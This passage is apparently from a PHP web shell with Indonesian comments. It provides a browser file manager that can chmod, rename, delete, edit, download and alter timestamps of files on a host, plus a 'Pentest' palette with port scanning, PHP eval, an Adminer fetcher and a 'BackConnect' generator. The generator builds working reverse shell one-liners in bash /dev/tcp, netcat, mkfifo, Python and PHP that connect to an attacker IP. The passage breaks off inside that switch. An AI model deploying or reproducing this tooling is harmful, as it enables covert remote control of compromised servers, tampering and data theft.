            <button type="submit" name="go_dir" value="<?php echo htmlspecialchars($current_dir); ?>" style="background:none;border:none;color:#ff6666;cursor:pointer;padding:0;">.</button>
        </form>
    </td>
    <td>Directory</td>
    <td>
        <?php
        $current_dir_owner = fileowner($current_dir);
        $current_dir_group = filegroup($current_dir);
        $current_dir_owner_name = function_exists('posix_getpwuid') ? posix_getpwuid($current_dir_owner)['name'] : $current_dir_owner;
        $current_dir_group_name = function_exists('posix_getgrgid') ? posix_getgrgid($current_dir_group)['name'] : $current_dir_group;
        echo htmlspecialchars($current_dir_owner_name . ':' . $current_dir_group_name);
        ?>
    </td>
    <td>
        <?php
        $current_dir_perms = fileperms($current_dir);
        echo permsToString($current_dir_perms, $current_dir, $current_uid, $current_gid);
        ?>
    </td>
    <td>
        <span class="clickable-date" onclick="showTouchForm('<?php echo htmlspecialchars($current_dir); ?>', '<?php echo date("Y-m-d H:i:s", filemtime($current_dir)); ?>')">
            <?php echo date("Y-m-d H:i:s", filemtime($current_dir)); ?>
        </span>
    </td>
    <td class="actions-cell">
        <form method="POST" style="display:inline;" id="chmodFormCurrent">
            <input type="hidden" name="chmod" value="<?php echo htmlspecialchars($current_dir); ?>">
            <input type="text" name="chmod_value" placeholder="<?php echo getPermsOctal($current_dir); ?>" pattern="[0-7]{3,4}" required style="width:50px; vertical-align: middle;" value="<?php echo getPermsOctal($current_dir); ?>">
            <button type="button" onclick="showChmodConfirm('chmodFormCurrent', '<?php echo htmlspecialchars(basename($current_dir)); ?>')" class="action-btn">Chmod</button>
        </form>
    </td>
</tr>

<!-- Baris navigasi untuk direktori sebelumnya (..) -->
<?php
$parent_dir = dirname($current_dir);
if ($parent_dir && is_dir($parent_dir) && $parent_dir !== $current_dir):
?>
<tr>
    <td class="checkbox-col"></td>
    <td>
        <form method="POST" style="display:inline;">
            <button type="submit" name="go_dir" value="<?php echo htmlspecialchars($parent_dir); ?>" style="background:none;border:none;color:#ff6666;cursor:pointer;padding:0;">..</button>
        </form>
    </td>
    <td>Directory</td>
    <td>
        <?php
        $parent_dir_owner = fileowner($parent_dir);
        $parent_dir_group = filegroup($parent_dir);
        $parent_dir_owner_name = function_exists('posix_getpwuid') ? posix_getpwuid($parent_dir_owner)['name'] : $parent_dir_owner;
        $parent_dir_group_name = function_exists('posix_getgrgid') ? posix_getgrgid($parent_dir_group)['name'] : $parent_dir_group;
        echo htmlspecialchars($parent_dir_owner_name . ':' . $parent_dir_group_name);
        ?>
    </td>
    <td>
        <?php
        $parent_dir_perms = fileperms($parent_dir);
        echo permsToString($parent_dir_perms, $parent_dir, $current_uid, $current_gid);
        ?>
    </td>
    <td>
        <span class="clickable-date" onclick="showTouchForm('<?php echo htmlspecialchars($parent_dir); ?>', '<?php echo date("Y-m-d H:i:s", filemtime($parent_dir)); ?>')">
            <?php echo date("Y-m-d H:i:s", filemtime($parent_dir)); ?>
        </span>
    </td>
    <td class="actions-cell">
        <form method="POST" style="display:inline;" id="chmodFormParent">
            <input type="hidden" name="chmod" value="<?php echo htmlspecialchars($parent_dir); ?>">
            <input type="text" name="chmod_value" placeholder="<?php echo getPermsOctal($parent_dir); ?>" pattern="[0-7]{3,4}" required style="width:50px; vertical-align: middle;" value="<?php echo getPermsOctal($parent_dir); ?>">
            <button type="button" onclick="showChmodConfirm('chmodFormParent', '<?php echo htmlspecialchars(basename($parent_dir)); ?>')" class="action-btn">Chmod</button>
        </form>
    </td>
</tr>
<?php endif; ?>

<?php
$items = scandir($current_dir);
$folders = array();
$files = array();
foreach ($items as $item) {
    if ($item === '.' || $item === '..') continue;
    $fullpath = $current_dir . DIRECTORY_SEPARATOR . $item;
    if (is_dir($fullpath)) {
        $folders[] = $item;
    } else {
        $files[] = $item;
    }
}

$current_uid = function_exists('posix_geteuid') ? posix_geteuid() : null;
$current_gid = function_exists('posix_getegid') ? posix_getegid() : null;

$i = 0;
foreach ($folders as $item):
    $fullpath = $current_dir . DIRECTORY_SEPARATOR . $item;
    $perms_octal = fileperms($fullpath);
    $perms_string = permsToString($perms_octal, $fullpath, $current_uid, $current_gid);
    $size = 'Directory';
    $mod = date("Y-m-d H:i:s", filemtime($fullpath));

    $owner_id = fileowner($fullpath);
    $group_id = filegroup($fullpath);
    $owner_name = function_exists('posix_getpwuid') ? posix_getpwuid($owner_id)['name'] : $owner_id;
    $group_name = function_exists('posix_getgrgid') ? posix_getgrgid($group_id)['name'] : $group_id;

    $user_group_class = (($owner_id !== $current_uid || $group_id !== $current_gid) && ($current_uid !== null || $current_gid !== null)) ? 'user-group-diff' : '';
?>
<tr>
    <td class="checkbox-col"><input type="checkbox" name="items[]" value="<?php echo htmlspecialchars($fullpath); ?>"></td>
    <td>
        <form method="POST" style="display:inline;">
            <button type="submit" name="go_dir" value="<?php echo htmlspecialchars($fullpath); ?>" style="background:none;border:none;color:#ff6666;cursor:pointer;padding:0;">
                <?php echo htmlspecialchars($item); ?>
            </button>
        </form>
    </td>
    <td><?php echo $size; ?></td>
    <td class="<?php echo $user_group_class; ?>"><?php echo htmlspecialchars($owner_name . ':' . $group_name); ?></td>
    <td><?php echo $perms_string; ?></td>
    <td><span class="clickable-date" onclick="showTouchForm('<?php echo htmlspecialchars($fullpath); ?>', '<?php echo htmlspecialchars($mod); ?>')"><?php echo $mod; ?></span></td>
    <td class="actions-cell">
        <form method="POST" style="display:inline;" id="chmodForm<?php echo $i; ?>">
            <input type="hidden" name="chmod" value="<?php echo htmlspecialchars($fullpath); ?>">
            <input type="text" name="chmod_value" placeholder="<?php echo getPermsOctal($fullpath); ?>" pattern="[0-7]{3,4}" required style="width:50px; vertical-align: middle;" value="<?php echo getPermsOctal($fullpath); ?>">
            <button type="button" onclick="showChmodConfirm('chmodForm<?php echo $i; ?>', '<?php echo htmlspecialchars(basename($fullpath)); ?>')" class="action-btn">Chmod</button>
        </form>
        <form method="POST" style="display:inline;">
            <input type="hidden" name="rename" value="<?php echo htmlspecialchars($fullpath); ?>">
            <input type="text" name="rename_new" placeholder="Rename to" required style="width:120px; vertical-align: middle;">
            <button type="submit" class="action-btn">Rename</button>
        </form>
        <!-- Untuk folder -->
        <form method="POST" style="display:inline;" id="deleteForm<?php echo $i; ?>">
            <input type="hidden" name="delete_single_item" value="1">
            <input type="hidden" name="delete_item_name" value="<?php echo htmlspecialchars($fullpath); ?>">
            <button type="button" onclick="showDeleteConfirm('deleteForm<?php echo $i; ?>', '<?php echo htmlspecialchars($item); ?>', 'folder')" class="action-btn">Delete</button>
        </form>
    </td>
</tr>
<?php 
$i++;
endforeach; ?>

<?php
foreach ($files as $item):
    $fullpath = $current_dir . DIRECTORY_SEPARATOR . $item;
    $perms_octal = fileperms($fullpath);
    $perms_string = permsToString($perms_octal, $fullpath, $current_uid, $current_gid);
    $size = formatSize(filesize($fullpath));
    $mod = date("Y-m-d H:i:s", filemtime($fullpath));

    $owner_id = fileowner($fullpath);
    $group_id = filegroup($fullpath);
    $owner_name = function_exists('posix_getpwuid') ? posix_getpwuid($owner_id)['name'] : $owner_id;
    $group_name = function_exists('posix_getgrgid') ? posix_getgrgid($group_id)['name'] : $group_id;

    $user_group_class = (($owner_id !== $current_uid || $group_id !== $current_gid) && ($current_uid !== null || $current_gid !== null)) ? 'user-group-diff' : '';
?>
<tr>
    <td class="checkbox-col"><input type="checkbox" name="items[]" value="<?php echo htmlspecialchars($fullpath); ?>"></td>
    <td>
        <form method="POST" style="display:inline;">
            <button type="submit" name="view_file" value="<?php echo htmlspecialchars($fullpath); ?>" style="background:none;border:none;color:white;cursor:pointer;padding:0;">
                <?php echo htmlspecialchars($item); ?>
            </button>
        </form>
    </td>
    <td><?php echo $size; ?></td>
    <td class="<?php echo $user_group_class; ?>"><?php echo htmlspecialchars($owner_name . ':' . $group_name); ?></td>
    <td><?php echo $perms_string; ?></td>
    <td><span class="clickable-date" onclick="showTouchForm('<?php echo htmlspecialchars($fullpath); ?>', '<?php echo htmlspecialchars($mod); ?>')"><?php echo $mod; ?></span></td>
    <td class="actions-cell">
        <form method="POST" style="display:inline;" id="chmodForm<?php echo $i; ?>">
            <input type="hidden" name="chmod" value="<?php echo htmlspecialchars($fullpath); ?>">
            <input type="text" name="chmod_value" placeholder="<?php echo getPermsOctal($fullpath); ?>" pattern="[0-7]{3,4}" required style="width:50px; vertical-align: middle;" value="<?php echo getPermsOctal($fullpath); ?>">
            <button type="button" onclick="showChmodConfirm('chmodForm<?php echo $i; ?>', '<?php echo htmlspecialchars(basename($fullpath)); ?>')" class="action-btn">Chmod</button>
        </form>
        <form method="POST" style="display:inline;">
            <input type="hidden" name="rename" value="<?php echo htmlspecialchars($fullpath); ?>">
            <input type="text" name="rename_new" placeholder="Rename to" required style="width:120px; vertical-align: middle;">
            <button type="submit" class="action-btn">Rename</button>
        </form>
        <form method="POST" style="display:inline;" onsubmit="return false;">
            <input type="hidden" name="edit_file" value="<?php echo htmlspecialchars($fullpath); ?>">
            <button type="button" class="action-btn" onclick="showEditForm('<?php echo htmlspecialchars($fullpath); ?>')">Edit</button>
        </form>
        <!-- Untuk file -->
        <form method="POST" style="display:inline;" id="deleteForm<?php echo $i; ?>">
            <input type="hidden" name="delete_single_item" value="1">
            <input type="hidden" name="delete_item_name" value="<?php echo htmlspecialchars($fullpath); ?>">
            <button type="button" onclick="showDeleteConfirm('deleteForm<?php echo $i; ?>', '<?php echo htmlspecialchars($item); ?>', 'file')" class="action-btn">Delete</button>
        </form>
        <form method="POST" style="display:inline;">
            <input type="hidden" name="download" value="<?php echo htmlspecialchars($fullpath); ?>">
            <button type="submit" class="action-btn">Download</button>
        </form>
    </td>
</tr>
<?php 
$i++;
endforeach;
?>
        </tbody>
    </table>
    
    <div class="action-row">
        <select name="bulk_action">
            <option value="">Pilih aksi</option>
            <option value="delete">Delete</option>
            <option value="zip">Compress (ZIP)</option>
            <option value="tar">Compress (TAR.GZ)</option>
            <option value="unzip">Extract (ZIP)</option>
            <option value="untar">Extract (TAR.GZ)</option>
        </select>
        <input type="submit" value="Apply" class="btn-apply">
    </div>
</form>

<script>
function showMessage(message, type) {
    const messageContainer = document.getElementById('messageContainer');
    const messageElement = document.createElement('div');
    messageElement.className = 'message ' + type;
    messageElement.setAttribute('data-full-text', message);
    messageElement.innerHTML = message + '<span class="message-close" onclick="this.parentElement.remove()">×</span>';
    
    // Tambahkan event listener untuk klik
    messageElement.addEventListener('click', function(e) {
        // Jangan ekspansi jika yang diklik adalah tombol close
        if (!e.target.classList.contains('message-close')) {
            this.classList.toggle('expanded');
        }
    });
    
    messageContainer.appendChild(messageElement);
    
    // Hapus pesan setelah 5 detik
    setTimeout(() => {
        messageElement.remove();
    }, 5000);
}

// Tampilkan pesan dari session jika ada
<?php if (isset($_SESSION['message'])): ?>
    showMessage('<?php echo addslashes($_SESSION['message']['text']); ?>', '<?php echo $_SESSION['message']['type']; ?>');
    <?php unset($_SESSION['message']); ?>
<?php endif; ?>

// Fungsi untuk checkbox select all
document.getElementById('checkAll').addEventListener('change', function() {
    const checkboxes = document.querySelectorAll('input[name="items[]"]');
    checkboxes.forEach(checkbox => {
        checkbox.checked = this.checked;
    });
});

// Fungsi untuk scroll ke atas
function scrollToTop() {
    window.scrollTo({
        top: 0,
        behavior: 'smooth'
    });
}

// Fungsi untuk menutup semua form
function closeAllForms() {
    document.getElementById('viewFileSection').style.display = 'none';
    document.getElementById('editFormContainer').style.display = 'none';
    document.getElementById('touchFormContainer').style.display = 'none';
}

// Fungsi untuk menampilkan form touch
function showTouchForm(filePath, currentTimestamp) {
    // Tutup semua form lain
    closeAllForms();
    
    // Tampilkan form touch
    document.getElementById('touchFormContainer').style.display = 'block';
    document.getElementById('touchFileName').textContent = filePath;
    document.getElementById('saveTouchPath').value = filePath;
    document.getElementById('touchValue').value = currentTimestamp;
    
    // Scroll ke atas dengan sedikit delay untuk memastikan form sudah muncul
    setTimeout(scrollToTop, 10);
}

// Fungsi untuk menyembunyikan form touch
function hideTouchForm() {
    document.getElementById('touchFormContainer').style.display = 'none';
}

// Fungsi untuk menampilkan form edit
function showEditForm(filePath) {
    // Tutup semua form lain
    closeAllForms();
    
    // Tampilkan form edit
    document.getElementById('editFormContainer').style.display = 'block';
    
    // Set nilai path file
    document.getElementById('saveEditPath').value = filePath;
    
    // Set nama file
    document.getElementById('editFileName').textContent = filePath;
    
    // Ambil konten file via AJAX
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            if (xhr.status === 200) {
                document.getElementById('editContent').value = xhr.responseText;
            } else {
                alert('Gagal memuat konten file');
            }
        }
    };
    xhr.open('GET', '?get_file_content=' + encodeURIComponent(filePath), true);
    xhr.send();
    
    // Scroll ke atas
    scrollToTop();
}

// Tambahkan event listener untuk form edit
document.addEventListener('DOMContentLoaded', function() {
    const editForm = document.getElementById('editForm');
    if (editForm) {
        editForm.addEventListener('submit', function(e) {
            const content = document.getElementById('editContent').value;
            
            // Jika konten kosong, tampilkan konfirmasi
            if (content.trim() === '') {
                e.preventDefault();
                
                if (confirm('Are you sure you want to save an empty file?')) {
                    // Lanjutkan submit form
                    this.submit();
                }
            }
        });
    }
});

// Fungsi untuk menyembunyikan form edit
function hideEditForm() {
    document.getElementById('editFormContainer').style.display = 'none';
}

// Override fungsi showTouchForm asli
window.showTouchForm = function(filePath, currentTimestamp) {
    // Tutup semua form lain
    closeAllForms();
    
    // Tampilkan form touch
    document.getElementById('touchFormContainer').style.display = 'block';
    document.getElementById('touchFileName').textContent = filePath;
    document.getElementById('saveTouchPath').value = filePath;
    document.getElementById('touchValue').value = currentTimestamp;
    
    // Scroll ke atas dengan sedikit delay untuk memastikan form sudah muncul
    setTimeout(scrollToTop, 10);
};

// Variabel untuk modal konfirmasi
var currentFormId = null;
var currentAction = null;

// Fungsi untuk menampilkan konfirmasi Chmod
function showChmodConfirm(formId, fileName) {
    currentFormId = formId;
    currentAction = 'chmod';
    document.getElementById('confirmMessage').textContent = 
        'Are you sure you want to change permissions for "' + fileName + '"?';
    document.getElementById('confirmModal').style.display = 'block';
}

// Fungsi untuk menampilkan konfirmasi Delete dari kolom Aksi
function showDeleteConfirm(formId, itemName, itemType) {
    currentFormId = formId;
    currentAction = 'delete';
    document.getElementById('confirmMessage').textContent = 
        'Are you sure you want to delete the ' + itemType + ' "' + itemName + '"?';
    document.getElementById('confirmModal').style.display = 'block';
}

// Fungsi untuk menampilkan konfirmasi Delete dari action-row
function showDeleteActionConfirm() {
    const deleteForm = document.getElementById('deleteActionForm');
    const deletePath = deleteForm.querySelector('input[name="delete_item_name"]').value;
    
    if (!deletePath) {
        showMessage('Please enter a file/folder path to delete', 'error');
        return;
    }
    
    currentFormId = 'deleteActionForm';
    currentAction = 'delete';
    document.getElementById('confirmMessage').textContent = 
        'Are you sure you want to delete "' + deletePath + '"?';
    document.getElementById('confirmModal').style.display = 'block';
}

// Event listener untuk tombol Yes pada modal konfirmasi
document.getElementById('confirmYes').onclick = function() {
    if (currentFormId) {
        const form = document.getElementById(currentFormId);
        if (form) {
            form.submit();
        }
    }
    document.getElementById('confirmModal').style.display = 'none';
};

// Event listener untuk tombol No pada modal konfirmasi
document.getElementById('confirmNo').onclick = function() {
    document.getElementById('confirmModal').style.display = 'none';
};

function updateFileName(input) {
    if (input.files && input.files[0]) {
        var fileName = input.files[0].name;
        document.getElementById('fileLabel').textContent = fileName;
    } else {
        document.getElementById('fileLabel').textContent = 'Choose file...';
    }
}

document.addEventListener('DOMContentLoaded', function() {
    // Setup MutationObserver untuk memantau perubahan pada form touch
    const touchFormContainer = document.getElementById('touchFormContainer');
    const observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
            if (mutation.type === 'attributes' && mutation.attributeName === 'style') {
                const displayValue = touchFormContainer.style.display;
                if (displayValue === 'block') {
                    // Form touch baru saja ditampilkan, scroll ke atas
                    setTimeout(scrollToTop, 50);
                }
            }
        });
    });
    
    // Mulai memantau perubahan atribut style pada form touch
    observer.observe(touchFormContainer, { attributes: true });
    
    // Tangani semua tombol Touch di seluruh halaman (kolom Dimodifikasi)
    const allTouchButtons = document.querySelectorAll('.clickable-date');
    allTouchButtons.forEach(element => {
        // Simpan nilai onclick asli
        const originalOnclick = element.getAttribute('onclick');
        
        if (originalOnclick && originalOnclick.includes('showTouchForm')) {
            // Ekstrak parameter dari onclick
            const matches = originalOnclick.match(/'([^']+)'/g);
            if (matches && matches.length >= 2) {
                const filePath = matches[0].replace(/'/g, '');
                const timestamp = matches[1].replace(/'/g, '');
                
                // Hapus onclick asli
                element.removeAttribute('onclick');
                
                // Tambahkan event listener baru
                element.addEventListener('click', function(e) {
                    e.preventDefault();
                    e.stopPropagation();
                    
                    // Panggil fungsi showTouchForm yang sudah di-override
                    window.showTouchForm(filePath, timestamp);
                }, true); // Use capture phase
            }
        }
    });
    
    // Tangani semua tombol Edit di View File Section
    const editButtons = document.querySelectorAll('#viewFileSection button[onclick^="showEditForm"]');
    editButtons.forEach(button => {
        button.addEventListener('click', function(e) {
            e.preventDefault();
            const filePath = this.getAttribute('onclick').match(/'([^']+)'/)[1];
            showEditForm(filePath);
        });
    });
    
    // Tangani semua tombol Touch di View File Section
    const touchButtons = document.querySelectorAll('#viewFileSection button[onclick^="showTouchForm"]');
    touchButtons.forEach(button => {
        button.addEventListener('click', function(e) {
            e.preventDefault();
            const onclickText = this.getAttribute('onclick');
            const matches = onclickText.match(/'([^']+)'/g);
            if (matches && matches.length >= 2) {
                const filePath = matches[0].replace(/'/g, '');
                const timestamp = matches[1].replace(/'/g, '');
                showTouchForm(filePath, timestamp);
            }
        });
    });
    
    // Tangani tombol Touch di dalam form Edit
    const editFormTouchButtons = document.querySelectorAll('#editFormContainer button[onclick^="showTouchForm"]');
    editFormTouchButtons.forEach(button => {
        button.addEventListener('click', function(e) {
            e.preventDefault();
            const onclickText = this.getAttribute('onclick');
            const matches = onclickText.match(/'([^']+)'/g);
            if (matches && matches.length >= 2) {
                const filePath = matches[0].replace(/'/g, '');
                const timestamp = matches[1].replace(/'/g, '');
                showTouchForm(filePath, timestamp);
            }
        });
    });
});

// ==========================================
// COMMAND PALETTE - DIRECT DIRECTORY NAVIGATION
// Bypass-friendly implementation
// ==========================================
(function() {
    const palette = document.getElementById('cmdPalette');
    const overlay = document.getElementById('cmdPaletteOverlay');
    const input = document.getElementById('cmdPaletteInput');
    const form = document.getElementById('cmdPaletteForm');
    
    // Fungsi membuka palette
    function openPalette() {
        palette.classList.add('active');
        overlay.classList.add('active');
        input.value = '';
        input.focus();
    }
    
    // Fungsi menutup palette
    function closePalette() {
        palette.classList.remove('active');
        overlay.classList.remove('active');
    }
    
    // Event listener untuk keyboard shortcut
    document.addEventListener('keydown', function(e) {
        // Ctrl+Shift+K atau Cmd+Shift+K
        if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'K' || e.key === 'k')) {
            e.preventDefault();
            openPalette();
        }
        // Esc untuk menutup
        if (e.key === 'Escape') {
            closePalette();
        }
    });
    
    // Klik overlay untuk menutup
    overlay.addEventListener('click', closePalette);
    
    // Handle form submit
    form.addEventListener('submit', function(e) {
        // Biarkan form submit normally untuk navigasi
        // Tetapi kosongkan input setelah submit untuk UX yang lebih baik
        setTimeout(function() {
            closePalette();
        }, 100);
    });
    
    // Auto-focus saat halaman dimuat (opsional, non-intrusive)
    // Palet tidak akan muncul sampai shortcut ditekan
})();

// ==========================================
// COMMAND PALETTE - LIST TOOLS
// Bypass-friendly implementation
// ==========================================
document.addEventListener('DOMContentLoaded', function() {
    const toolsPalette = document.getElementById('toolsPalette');
    const toolsOverlay = document.getElementById('toolsPaletteOverlay');
    const toolsSearch = document.getElementById('toolsPaletteSearch');
    const toolsList = document.getElementById('toolsPaletteList');
    const toolsCount = document.getElementById('toolsCount');
    
    if (!toolsPalette || !toolsSearch) {
        console.error('Tools palette elements not found');
        return;
    }
    
    // Daftar tools Pentest
    const commonTools = [
        { 
            name: 'Get Adminer', 
            desc: 'Download Adminer PHP to current dir', 
            category: 'Pentest',
            action: 'get_adminer'
        },
        { 
            name: 'Scan Port', 
            desc: 'Port scanner (target ports)', 
            category: 'Pentest',
            action: 'scan_port'
        },
        { 
            name: 'BackConnect', 
            desc: 'Reverse shell connection', 
            category: 'Pentest',
            action: 'backconnect'
        },
        { 
            name: 'PHP Eval', 
            desc: 'Execute PHP code', 
            category: 'Pentest',
            action: 'php_eval'
        }
    ];
    
    let filteredTools = [];
    let selectedIndex = -1;
    let toolPaths = {};
    
    // Deteksi tool yang tersedia (simulasi)
    function detectTools() {
        return commonTools.map(tool => {
            return {
                ...tool,
                available: true // Default tampilkan semua
            };
        });
    }
    
    // Render list tools
    function renderTools(tools) {
        if (tools.length === 0) {
            toolsList.innerHTML = '<div class="tools-empty">No tools found</div>';
            toolsCount.textContent = '0 tools';
            return;
        }
        
        let currentCategory = '';
        let html = '';
        
        tools.forEach((tool, index) => {
            if (tool.category !== currentCategory) {
                currentCategory = tool.category;
                html += `<div class="tool-category">${currentCategory}</div>`;
            }
            
            const activeClass = index === selectedIndex ? 'active' : '';
            html += `
                <div class="tool-item ${activeClass}" data-index="${index}" data-name="${tool.name}">
                    <span class="tool-icon">$</span>
                    <span class="tool-name">${tool.name}</span>
                    <span class="tool-desc">${tool.desc}</span>
                </div>
            `;
        });
        
        toolsList.innerHTML = html;
        toolsCount.textContent = `${tools.length} tools`;
        
        // Tambahkan event listener untuk click
        toolsList.querySelectorAll('.tool-item').forEach(item => {
            item.addEventListener('click', function() {
                const toolName = this.getAttribute('data-name');
                executeTool(toolName);
            });
        });
    }
    
    // Filter tools berdasarkan search
    function filterTools(query) {
        if (!query) {
            filteredTools = detectTools();
        } else {
            const lowerQuery = query.toLowerCase();
            filteredTools = detectTools().filter(tool => 
                tool.name.toLowerCase().includes(lowerQuery) ||
                tool.desc.toLowerCase().includes(lowerQuery) ||
                tool.category.toLowerCase().includes(lowerQuery)
            );
        }
        selectedIndex = -1;
        renderTools(filteredTools);
    }
    
    // Execute tool - handle specific pentest actions
    function executeTool(toolName) {
        const tool = commonTools.find(t => t.name === toolName);
        if (!tool) return;
        
        closeToolsPalette();
        
        switch(tool.action) {
            case 'get_adminer':
                executeGetAdminer();
                break;
            case 'scan_port':
                showScanPortForm();
                break;
            case 'backconnect':
                showBackConnectForm();
                break;
            case 'php_eval':
                showPhpEvalForm();
                break;
            default:
                const cmdInput = document.getElementById('cmdInputText');
                if (cmdInput) {
                    cmdInput.value = toolName;
                    cmdInput.focus();
                }
        }
    }
    
    // Get Adminer - Download Adminer PHP via POST form
    function executeGetAdminer() {
        // Create and submit form for PHP backend handler
        const form = document.createElement('form');
        form.method = 'POST';
        form.style.display = 'none';
        
        const actionInput = document.createElement('input');
        actionInput.type = 'hidden';
        actionInput.name = 'tool_action';
        actionInput.value = 'get_adminer';
        
        form.appendChild(actionInput);
        document.body.appendChild(form);
        form.submit();
    }
    
    // Show Scan Port Form
    function showScanPortForm() {
        let form = document.getElementById('scanPortFormContainer');
        if (!form) {
            form = createPentestForm('scanPortFormContainer', 'Scan Port', `
                <div style="margin-bottom:10px;">
                    <label style="color:#888;font-size:12px;">Target Host:</label>
                    <input type="text" id="scanTarget" placeholder="127.0.0.1 or domain.com" style="width:100%;margin-top:5px;" value="127.0.0.1">
                </div>
                <div style="margin-bottom:10px;">
                    <label style="color:#888;font-size:12px;">Port Range:</label>
                    <input type="text" id="scanPorts" placeholder="1-1000 or 22,80,443,3306" style="width:100%;margin-top:5px;" value="22,80,443,3306,5432,6379,8080">
                </div>
                <div style="display:flex;gap:10px;">
                    <button type="button" onclick="executeScanPort()" class="btn-upload">Scan</button>
                    <button type="button" onclick="closePentestForm('scanPortFormContainer')" style="background:#444;">Cancel</button>
                </div>
            `);
        }
        form.style.display = 'block';
        document.getElementById('scanTarget').focus();
    }
    
    // Execute Scan Port - Submit POST form to PHP backend
    window.executeScanPort = function() {
        const target = document.getElementById('scanTarget').value.trim();
        const ports = document.getElementById('scanPorts').value.trim();
        if (!target || !ports) {
            alert('Please fill in all fields');
            return;
        }
        
        // Create and submit form for PHP backend handler
        const form = document.createElement('form');
        form.method = 'POST';
        form.style.display = 'none';
        
        const actionInput = document.createElement('input');
        actionInput.type = 'hidden';
        actionInput.name = 'tool_action';
        actionInput.value = 'scan_port';
        
        const hostInput = document.createElement('input');
        hostInput.type = 'hidden';
        hostInput.name = 'scan_host';
        hostInput.value = target;
        
        const portsInput = document.createElement('input');
        portsInput.type = 'hidden';
        portsInput.name = 'scan_ports';
        portsInput.value = ports;
        
        const timeoutInput = document.createElement('input');
        timeoutInput.type = 'hidden';
        timeoutInput.name = 'scan_timeout';
        timeoutInput.value = '2';
        
        form.appendChild(actionInput);
        form.appendChild(hostInput);
        form.appendChild(portsInput);
        form.appendChild(timeoutInput);
        document.body.appendChild(form);
        form.submit();
    };
    
    // Show BackConnect Form
    function showBackConnectForm() {
        let form = document.getElementById('backconnectFormContainer');
        if (!form) {
            form = createPentestForm('backconnectFormContainer', 'BackConnect (Reverse Shell)', `
                <div style="margin-bottom:10px;">
                    <label style="color:#888;font-size:12px;">Your IP (Attacker):</label>
                    <input type="text" id="bcIp" placeholder="10.10.10.10" style="width:100%;margin-top:5px;">
                </div>
                <div style="margin-bottom:10px;">
                    <label style="color:#888;font-size:12px;">Port:</label>
                    <input type="text" id="bcPort" placeholder="4444" style="width:100%;margin-top:5px;" value="4444">
                </div>
                <div style="margin-bottom:10px;">
                    <label style="color:#888;font-size:12px;">Method:</label>
                    <select id="bcMethod" style="width:100%;margin-top:5px;background:#222;color:#fff;border:1px solid #555;padding:5px;">
                        <optgroup label="Bash">
                            <option value="bash">Bash /dev/tcp</option>
                            <option value="bash_udp">Bash /dev/udp</option>
                        </optgroup>
                        <optgroup label="Netcat">
                            <option value="nc_e">Netcat -e /bin/sh</option>
                            <option value="mkfifo">Netcat + MKFIFO (no -e)</option>
                            <option value="nc_openbsd">Netcat OpenBSD</option>
                        </optgroup>
                        <optgroup label="Python">
                            <option value="python3" selected>Python3</option>
                            <option value="python">Python</option>
                            <option value="python3_pty">Python3 PTY (TTY)</option>
                        </optgroup>
                        <optgroup label="PHP">
                            <option value="php">PHP exec()</option>
                            <option value="php_popen">PHP popen()</option>
                            <option value="php_shell">PHP shell_exec()</option>
                            <option value="php_system">PHP system()</option>
                        </optgroup>
                        <optgroup label="Perl">
                            <option value="perl">Perl Socket</option>
                            <option value="perl_nosh">Perl (no sh)</option>
                        </optgroup>
                        <optgroup label="Ruby">
                            <option value="ruby">Ruby Socket</option>
                            <option value="ruby_nosh">Ruby (no sh)</option>
                        </optgroup>
                        <optgroup label="Other">
                            <option value="socat">Socat</option>
                            <option value="socat_tty">Socat TTY</option>
                            <option value="awk">AWK</option>
                            <option value="lua">Lua</option>
                            <option value="lua51">Lua5.1</option>
                            <option value="telnet">Telnet + MKFIFO</option>
                            <option value="golang">Go (Golang)</option>
                            <option value="nodejs">Node.js</option>
                            <option value="java">Java</option>
                            <option value="c">C Program</option>
                            <option value="powershell">PowerShell</option>
                            <option value="powercat">Powercat</option>
                        </optgroup>
                    </select>
                </div>
                <div style="display:flex;gap:10px;">
                    <button type="button" onclick="executeBackConnect()" class="btn-upload">Connect</button>
                    <button type="button" onclick="closePentestForm('backconnectFormContainer')" style="background:#444;">Cancel</button>
                </div>
            `);
        }
        form.style.display = 'block';
        document.getElementById('bcIp').focus();
    }
    
    // Execute BackConnect - Reverse Shell Payloads from revshells.com
    window.executeBackConnect = function() {
        const ip = document.getElementById('bcIp').value.trim();
        const port = document.getElementById('bcPort').value.trim();
        const method = document.getElementById('bcMethod').value;
        
        if (!ip || !port) {
            alert('Please fill in IP and Port');
            return;
        }
        
        let command = '';
        switch(method) {
            // Bash TCP - Most reliable
            case 'bash':
                command = `bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'`;
                break;
            // Bash UDP
            case 'bash_udp':
                command = `bash -c 'bash -i >& /dev/udp/${ip}/${port} 0>&1'`;
                break;
            // Netcat with -e
            case 'nc_e':
                command = `nc -e /bin/sh ${ip} ${port}`;
                break;
            // Netcat without -e (mkfifo)
            case 'mkfifo':
                command = `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`;
                break;
            // Netcat OpenBSD (no -e)
            case 'nc_openbsd':
                command = `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`;
                break;
            // Python3
            case 'python3':
                command = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`;
                break;
            // Python
            case 'python':
                command = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`;
                break;
            // Python3 PTY (TTY shell)
            case 'python3_pty':
                command = `python3 -c "import pty; pty.spawn('/bin/bash')" && echo 'import pty; pty.spawn("/bin/bash")' | python3`;
                break;
            // PHP
            case 'php':
                command = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
                break;
            // PHP 5-8
            case 'php_popen':
                command = `php -r '$sock=fsockopen("${ip}",${port});popen("/bin/sh -i <&3 >&3 2>&3", "r");'`;
                break;
            // PHP shell_exec
            case 'php_shell':
